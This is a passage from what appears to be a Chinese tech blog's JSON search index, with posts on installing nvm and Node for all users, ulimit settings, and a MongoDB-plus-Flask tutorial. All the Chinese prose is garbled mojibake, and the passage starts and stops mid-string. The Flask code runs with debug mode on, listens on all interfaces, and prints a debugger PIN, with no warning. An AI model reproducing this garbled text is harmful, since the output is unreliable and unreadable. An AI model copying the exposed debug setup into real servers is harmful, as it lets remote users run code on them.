--version\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e7ã€å®‰è£…ç‰¹å®šç‰ˆæœ¬çš„node\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm install V18.18.2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e8ã€è®¾ç½®ç¼ºçœnodeçš„ç‰ˆæœ¬\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm \u003cspan class=\"nb\"\u003ealias\u003c/span\u003e default V18.18.2  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e9ã€éšåæŠŠç”¨æˆ·æ‹‰è¿›devç»„ï¼Œç„¶åç™»é™†å°±å¯ä»¥äº†ã€‚éªŒè¯å‘½ä»¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm list  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enode -v\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Ubuntuä¸‹å¦‚ä½•ç»™æ‰€æœ‰ç”¨æˆ·å®‰è£…nodejsçš„nvm"},{"content":"åŸºæœ¬å¸¸è¯†ï¼Œå„ç§è¯­ç„‰ä¸è¯¦å•Šï¼Œå…¶å®ulimitæœ€å¸¸ç”¨çš„å°±ä¸¤ä¸ªå‚æ•°\n-u number: å•ä¸ªç”¨æˆ·èƒ½è¿è¡Œçš„æœ€å¤§è¿›ç¨‹æ•° -n number: å•ä¸ªè¿›ç¨‹å¯ä»¥åŒæ—¶æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦çš„æœ€å¤§å€¼ï¼Œç¼ºçœ1024 æœ‰ä¸¤ä¸ªåœ°æ–¹éœ€è¦è®¾ç½®ï¼ŒHardå’ŒSoftï¼ŒHardæ˜¯Softçš„æœ€é«˜é™å€¼ï¼Œå¤©èŠ±æ¿ã€‚è¿™ä¸¤ä¸ªå€¼éƒ½å¯ä»¥é’ˆå¯¹æŸç”¨æˆ·å•ç‹¬è®¾ç½®ã€‚\næ‰€ä»¥è®¾æ³•å¦‚ä¸‹ï¼š\nulimit -S -n 10240 ulimit -H -n 20480 ulimit -S -u 10240 ulimit -H -u 20480 å¯ä»¥åœ¨/etc/security/limits.confé‡Œè®¾ç½®\n* soft nofile 65536 * hard nofile 65536 * soft nproc 131072 * hard nproc 131072 ä¹Ÿå¯ä»¥åœ¨/etc/rc.d/rc.localä¸­ç”¨å‘½ä»¤è®¾ç½®\ncat /etc/rc.d/rc.local ... ulimit -u 204800 -HSn 204800 ... ","permalink":"https://rendoumi.com/posts/20240118-ulimit/","summary":"\u003cp\u003eåŸºæœ¬å¸¸è¯†ï¼Œå„ç§è¯­ç„‰ä¸è¯¦å•Šï¼Œå…¶å®ulimitæœ€å¸¸ç”¨çš„å°±ä¸¤ä¸ªå‚æ•°\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-u number:  å•ä¸ªç”¨æˆ·èƒ½è¿è¡Œçš„æœ€å¤§è¿›ç¨‹æ•°\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-n number:  å•ä¸ªè¿›ç¨‹å¯ä»¥åŒæ—¶æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦çš„æœ€å¤§å€¼ï¼Œç¼ºçœ1024\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæœ‰ä¸¤ä¸ªåœ°æ–¹éœ€è¦è®¾ç½®ï¼ŒHardå’ŒSoftï¼ŒHardæ˜¯Softçš„æœ€é«˜é™å€¼ï¼Œå¤©èŠ±æ¿ã€‚è¿™ä¸¤ä¸ªå€¼éƒ½å¯ä»¥é’ˆå¯¹æŸç”¨æˆ·å•ç‹¬è®¾ç½®ã€‚\u003c/p\u003e\n\u003cp\u003eæ‰€ä»¥è®¾æ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eulimit\u003c/span\u003e -S -n \u003cspan class=\"m\"\u003e10240\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eulimit\u003c/span\u003e -H -n \u003cspan class=\"m\"\u003e20480\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eulimit\u003c/span\u003e -S -u \u003cspan class=\"m\"\u003e10240\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eulimit\u003c/span\u003e -H -u \u003cspan class=\"m\"\u003e20480\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¯ä»¥åœ¨/etc/security/limits.confé‡Œè®¾ç½®\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e* soft nofile \u003cspan class=\"m\"\u003e65536\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e* hard nofile \u003cspan class=\"m\"\u003e65536\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e* soft nproc \u003cspan class=\"m\"\u003e131072\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e* hard nproc \u003cspan class=\"m\"\u003e131072\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¹Ÿå¯ä»¥åœ¨/etc/rc.d/rc.localä¸­ç”¨å‘½ä»¤è®¾ç½®\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/rc.d/rc.local  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eulimit\u003c/span\u003e -u \u003cspan class=\"m\"\u003e204800\u003c/span\u003e -HSn \u003cspan class=\"m\"\u003e204800\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4\u003e\u003c/h4\u003e","title":"ulimitçš„ç”¨æ³•"},{"content":"é¦–å…ˆæ˜¯å®‰è£…mongodb\nyum install -y mongodb-server mongodb Installing for dependencies: boost-filesystem boost-iostreams boost-program-options boost-system boost-thread gperftools-libs libicu libunwind v8 ä¼šè£…ä¸€å †ä¾èµ–åŒ…ï¼Œbooståº“ï¼Œicuåº“ï¼Œv8åº“ï¼Œgperftoolsåº“ï¼Œéƒ½æ˜¯å¾ˆå‰å®³çš„åº“å•Šï¼\nå¯åŠ¨ï¼š\nservice mongod start å¯¼å…¥æµ·é‡æ•°æ®ï¼š\n[root@ovs-16-11-2 ~]# mongoimport -d mydb -c prj01 --type csv --file opendata_projects.csv --headerline connected to: 127.0.0.1 Thu Jul 28 09:50:47.002 Progress: 39118658/470754183 8% Thu Jul 28 09:50:47.002 74400 24800/second Thu Jul 28 09:50:50.033 Progress: 80042213/470754183 17% Thu Jul 28 09:50:50.033 150700 25116/second Thu Jul 28 09:50:53.145 Progress: 108143323/470754183 22% Thu Jul 28 09:50:53.145 202700 22522/second Thu Jul 28 09:50:56.004 Progress: 149781879/470754183 31% Thu Jul 28 09:50:56.004 280000 23333/second Thu Jul 28 09:50:59.001 Progress: 179705162/470754183 38% Thu Jul 28 09:50:59.001 336200 22413/second Thu Jul 28 09:51:03.385 Progress: 212197023/470754183 45% Thu Jul 28 09:51:03.385 396400 20863/second Thu Jul 28 09:51:06.015 Progress: 236552399/470754183 50% Thu Jul 28 09:51:06.015 441700 20077/second Thu Jul 28 09:51:09.299 Progress: 264365847/470754183 56% Thu Jul 28 09:51:09.299 493300 19732/second Thu Jul 28 09:51:12.001 Progress: 304790148/470754183 64% Thu Jul 28 09:51:12.001 568500 20303/second Thu Jul 28 09:51:15.033 Progress: 323508057/470754183 68% Thu Jul 28 09:51:15.033 603300 19461/second Thu Jul 28 09:51:18.607 Progress: 361610334/470754183 76% Thu Jul 28 09:51:18.607 674200 19829/second Thu Jul 28 09:51:21.000 Progress: 393748962/470754183 83% Thu Jul 28 09:51:21.000 733700 19829/second Thu Jul 28 09:51:24.007 Progress: 427667505/470754183 90% Thu Jul 28 09:51:24.007 796900 19922/second Thu Jul 28 09:51:27.001 Progress: 459658299/470754183 97% Thu Jul 28 09:51:27.001 857300 19937/second Thu Jul 28 09:51:27.793 check 9 878853 Thu Jul 28 09:51:27.979 imported 878852 objects è¿›å…¥å‘½ä»¤è¡Œï¼Œçœ‹çœ‹åº“çš„æ•´ä½“æƒ…å†µï¼š\nmongo use mydb show collections db.prj01.findOne() å®Œæ•´ç»“æœå¦‚ä¸‹ï¼š\nmongo MongoDB shell version: 2.4.14 connecting to: test \u0026gt; use mydb switched to db mydb \u0026gt; show collections prj01 system.indexes \u0026gt; db.prj01.findOne() { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;579964f41d36d69d1752f82b\u0026#34;), \u0026#34;_projectid\u0026#34; : \u0026#34;7342bd01a2a7725ce033a179d22e382d\u0026#34;, \u0026#34;_teacher_acctid\u0026#34; : \u0026#34;5c43ef5eac0f5857c266baa1ccfa3d3f\u0026#34;, \u0026#34;_schoolid\u0026#34; : \u0026#34;9e72d6f2f1e9367b578b6479aa5852b7\u0026#34;, \u0026#34;school_ncesid\u0026#34; : NumberLong(\u0026#34;360009702803\u0026#34;), \u0026#34;school_latitude\u0026#34; : 40.688454, \u0026#34;school_longitude\u0026#34; : -73.910432, \u0026#34;school_city\u0026#34; : \u0026#34;Brooklyn\u0026#34;, \u0026#34;school_state\u0026#34; : \u0026#34;NY\u0026#34;, \u0026#34;school_zip\u0026#34; : 11207, \u0026#34;school_metro\u0026#34; : \u0026#34;urban\u0026#34;, \u0026#34;school_district\u0026#34; : \u0026#34;New York City Dept Of Ed\u0026#34;, \u0026#34;school_county\u0026#34; : \u0026#34;Kings (Brooklyn)\u0026#34;, \u0026#34;school_charter\u0026#34; : \u0026#34;f\u0026#34;, \u0026#34;school_magnet\u0026#34; : \u0026#34;t\u0026#34;, \u0026#34;school_year_round\u0026#34; : \u0026#34;f\u0026#34;, \u0026#34;school_nlns\u0026#34; : \u0026#34;f\u0026#34;, \u0026#34;school_kipp\u0026#34; : \u0026#34;f\u0026#34;, \u0026#34;school_charter_ready_promise\u0026#34; : \u0026#34;f\u0026#34;, \u0026#34;teacher_prefix\u0026#34; : \u0026#34;Mr.\u0026#34;, \u0026#34;teacher_teach_for_america\u0026#34; : \u0026#34;f\u0026#34;, \u0026#34;teacher_ny_teaching_fellow\u0026#34; : \u0026#34;f\u0026#34;, \u0026#34;primary_focus_subject\u0026#34; : \u0026#34;Other\u0026#34;, \u0026#34;primary_focus_area\u0026#34; : \u0026#34;Applied Learning\u0026#34;, \u0026#34;secondary_focus_subject\u0026#34; : \u0026#34;\u0026#34;, \u0026#34;secondary_focus_area\u0026#34; : \u0026#34;\u0026#34;, \u0026#34;resource_type\u0026#34; : \u0026#34;Supplies\u0026#34;, \u0026#34;poverty_level\u0026#34; : \u0026#34;highest poverty\u0026#34;, \u0026#34;grade_level\u0026#34; : \u0026#34;Grades 6-8\u0026#34;, \u0026#34;vendor_shipping_charges\u0026#34; : \u0026#34;\u0026#34;, \u0026#34;sales_tax\u0026#34; : \u0026#34;\u0026#34;, \u0026#34;payment_processing_charges\u0026#34; : \u0026#34;\u0026#34;, \u0026#34;fulfillment_labor_materials\u0026#34; : \u0026#34;\u0026#34;, \u0026#34;total_price_excluding_optional_support\u0026#34; : 229, \u0026#34;total_price_including_optional_support\u0026#34; : 279.27, \u0026#34;students_reached\u0026#34; : 0, \u0026#34;total_donations\u0026#34; : 251, \u0026#34;num_donors\u0026#34; : 1, \u0026#34;eligible_double_your_impact_match\u0026#34; : \u0026#34;f\u0026#34;, \u0026#34;eligible_almost_home_match\u0026#34; : \u0026#34;f\u0026#34;, \u0026#34;funding_status\u0026#34; : \u0026#34;completed\u0026#34;, \u0026#34;date_posted\u0026#34; : \u0026#34;2002-09-13 00:00:00\u0026#34;, \u0026#34;date_completed\u0026#34; : \u0026#34;2002-09-23 00:00:00\u0026#34;, \u0026#34;date_thank_you_packet_mailed\u0026#34; : \u0026#34;2003-01-27 00:00:00\u0026#34;, \u0026#34;date_expiration\u0026#34; : \u0026#34;2003-12-31 00:00:00\u0026#34; } \u0026gt; å¤ªå¤šå­—æ®µäº†ï¼Œå¦‚æœæˆ‘ä»¬å°±æƒ³è¦å…¶ä¸­çš„6ä¸ªå­—æ®µï¼š\n\u0026gt; db.prj01.findOne({}, {school_state:1, resource_type:1, poverty_level:1, date_posted:1, total_donations:1, funding_status:1, _id:0}) { \u0026#34;school_state\u0026#34; : \u0026#34;NY\u0026#34;, \u0026#34;resource_type\u0026#34; : \u0026#34;Supplies\u0026#34;, \u0026#34;poverty_level\u0026#34; : \u0026#34;highest poverty\u0026#34;, \u0026#34;total_donations\u0026#34; : 251, \u0026#34;funding_status\u0026#34; : \u0026#34;completed\u0026#34;, \u0026#34;date_posted\u0026#34; : \u0026#34;2002-09-13 00:00:00\u0026#34; } è£…ä¸ªpymongo\npython -m pip install pymongo æµ‹ä¸€ä¸‹ï¼Œè¿›å…¥pythonå‘½ä»¤è¡Œï¼š\npython ... from pymongo import MongoClient MONGODB_HOST = \u0026#39;localhost\u0026#39; MONGODB_PORT = 27017 DBS_NAME = \u0026#39;mydb\u0026#39; COLLECTION_NAME = \u0026#39;prj01\u0026#39; FIELDS = {\u0026#39;school_state\u0026#39;: True, \u0026#39;resource_type\u0026#39;: True, \u0026#39;poverty_level\u0026#39;: True, \u0026#39;date_posted\u0026#39;: True, \u0026#39;total_donations\u0026#39;: True, \u0026#39;_id\u0026#39;: False} connection = MongoClient(MONGODB_HOST, MONGODB_PORT) collection = connection[DBS_NAME][COLLECTION_NAME] projects = collection.find(projection=FIELDS) for project in projects: print project ... {u\u0026#39;school_state\u0026#39;: u\u0026#39;MO\u0026#39;, u\u0026#39;date_posted\u0026#39;: u\u0026#39;2015-08-18 00:00:00\u0026#39;, u\u0026#39;poverty_level\u0026#39;: u\u0026#39;highest poverty\u0026#39;, u\u0026#39;resource_type\u0026#39;: u\u0026#39;Books\u0026#39;, u\u0026#39;total_donations\u0026#39;: 0} ... æ•°æ®ä¼šç–¯ç‹‚æ˜¾ç¤ºä¸€é˜µå­ï¼Œå…¶å®è¿™å°±æ˜¯ä¸€ä¸ªå®Œæ•´çš„pythonè®¿é—®mongodbçš„ç¨‹åºäº†ã€‚\nä¸‹é¢æˆ‘ä»¬æ¥å®Œæˆflaskçš„éƒ¨åˆ†\nè£…ä¸ªflask\npython -m pip install flask å»ºç«‹ä¸ªæ–‡ä»¶å¤¹flask01ï¼Œå»ºç«‹ç›®å½•templates\nflask01 â”œâ”€â”€ run.py â””â”€â”€ templates â””â”€â”€ index.html å‡†å¤‡ä¸€ä¸ªé¦–é¡µæ–‡ä»¶index.htmlæ”¾åˆ°ç›®å½•templatesä¸‹\ncat index.html \u0026lt;h1\u0026gt;Hello World\u0026lt;/h1\u0026gt; å‡†å¤‡ä¸»ç¨‹åºrun.py\nfrom flask import Flask from flask import render_template app = Flask(__name__) @app.route(\u0026#34;/\u0026#34;) def index(): return render_template(\u0026#34;index.html\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#39;0.0.0.0\u0026#39;,port=5000,debug=True) åˆ†é…ä¸ªurlæ¥å­˜å–mongodb\nfrom flask import Flask from flask import render_template from pymongo import MongoClient import json from bson import json_util from bson.json_util import dumps app = Flask(__name__) MONGODB_HOST = \u0026#39;localhost\u0026#39; MONGODB_PORT = 27017 DBS_NAME = \u0026#39;mydb\u0026#39; COLLECTION_NAME = \u0026#39;prj01\u0026#39; FIELDS = {\u0026#39;school_state\u0026#39;: True, \u0026#39;resource_type\u0026#39;: True, \u0026#39;poverty_level\u0026#39;: True, \u0026#39;date_posted\u0026#39;: True, \u0026#39;total_donations\u0026#39;: True, \u0026#39;_id\u0026#39;: False} @app.route(\u0026#34;/\u0026#34;) def index(): return render_template(\u0026#34;index.html\u0026#34;) @app.route(\u0026#34;/mydb/prj01\u0026#34;) def mydb_prj01(): connection = MongoClient(MONGODB_HOST, MONGODB_PORT) collection = connection[DBS_NAME][COLLECTION_NAME] projects = collection.find(projection=FIELDS) json_projects = [] for project in projects: json_projects.append(project) json_projects = json.dumps(json_projects, default=json_util.default) connection.close() return json_projects if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#39;0.0.0.0\u0026#39;,port=5000,debug=True) è¿è¡Œä¸€ä¸‹ï¼Œåœ¨æµè§ˆå™¨æ‰“å¼€è¿™ä¸ªurlï¼š\npython run.py * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit) * Restarting with stat * Debugger is active! * Debugger pin code: 373-144-494 172.16.8.1 - - [28/Jul/2016 10:13:27] \u0026#34;GET /mydb/prj01 HTTP/1.1\u0026#34; 200 - ç»“æœå¾ˆæ˜æ˜¾æ˜¯ä¸ªjson\n[{\u0026#34;school_state\u0026#34;: \u0026#34;NY\u0026#34;, \u0026#34;date_posted\u0026#34;: \u0026#34;2002-09-13 00:00:00\u0026#34;, \u0026#34;poverty_level\u0026#34;: \u0026#34;highest poverty\u0026#34;, \u0026#34;resource_type\u0026#34;: \u0026#34;Supplies\u0026#34;, \u0026#34;total_donations\u0026#34;: 251}, {\u0026#34;school_state\u0026#34;: \u0026#34;NY\u0026#34;, \u0026#34;date_posted\u0026#34;: \u0026#34;2002-09-16 00:00:00\u0026#34;, \u0026#34;poverty_level\u0026#34;: \u0026#34;moderate poverty\u0026#34;, \u0026#34;resource_type\u0026#34;: \u0026#34;Supplies\u0026#34;, \u0026#34;total_donations\u0026#34;: 125}, ... ] ","permalink":"https://rendoumi.com/posts/20240118-flask_mongo/","summary":"\u003cp\u003eé¦–å…ˆæ˜¯å®‰è£…mongodb\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y mongodb-server mongodb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eInstalling \u003cspan class=\"k\"\u003efor\u003c/span\u003e dependencies:  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e boost-filesystem                                      \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e boost-iostreams                                       \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e boost-program-options                                 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e boost-system                                          \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e boost-thread                                          \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e gperftools-libs                                       \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e libicu                                                \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e libunwind                                             \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e v8\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¼šè£…ä¸€å †ä¾èµ–åŒ…ï¼Œbooståº“ï¼Œicuåº“ï¼Œv8åº“ï¼Œgperftoolsåº“ï¼Œéƒ½æ˜¯å¾ˆå‰å®³çš„åº“å•Šï¼\u003c/p\u003e\n\u003cp\u003eå¯åŠ¨ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservice mongod start  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¯¼å…¥æµ·é‡æ•°æ®ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eroot@ovs-16-11-2 ~\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"c1\"\u003e# mongoimport -d mydb -c prj01 --type csv --file opendata_projects.csv --headerline\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econnected to: 127.0.0.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:50:47.002         Progress: 39118658/470754183    8%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:50:47.002             \u003cspan class=\"m\"\u003e74400\u003c/span\u003e   24800/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:50:50.033         Progress: 80042213/470754183    17%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:50:50.033             \u003cspan class=\"m\"\u003e150700\u003c/span\u003e  25116/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:50:53.145         Progress: 108143323/470754183   22%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:50:53.145             \u003cspan class=\"m\"\u003e202700\u003c/span\u003e  22522/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:50:56.004         Progress: 149781879/470754183   31%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:50:56.004             \u003cspan class=\"m\"\u003e280000\u003c/span\u003e  23333/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:50:59.001         Progress: 179705162/470754183   38%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:50:59.001             \u003cspan class=\"m\"\u003e336200\u003c/span\u003e  22413/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:03.385         Progress: 212197023/470754183   45%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:03.385             \u003cspan class=\"m\"\u003e396400\u003c/span\u003e  20863/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:06.015         Progress: 236552399/470754183   50%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:06.015             \u003cspan class=\"m\"\u003e441700\u003c/span\u003e  20077/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:09.299         Progress: 264365847/470754183   56%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:09.299             \u003cspan class=\"m\"\u003e493300\u003c/span\u003e  19732/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:12.001         Progress: 304790148/470754183   64%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:12.001             \u003cspan class=\"m\"\u003e568500\u003c/span\u003e  20303/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:15.033         Progress: 323508057/470754183   68%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:15.033             \u003cspan class=\"m\"\u003e603300\u003c/span\u003e  19461/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:18.607         Progress: 361610334/470754183   76%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:18.607             \u003cspan class=\"m\"\u003e674200\u003c/span\u003e  19829/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:21.000         Progress: 393748962/470754183   83%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:21.000             \u003cspan class=\"m\"\u003e733700\u003c/span\u003e  19829/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:24.007         Progress: 427667505/470754183   90%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan 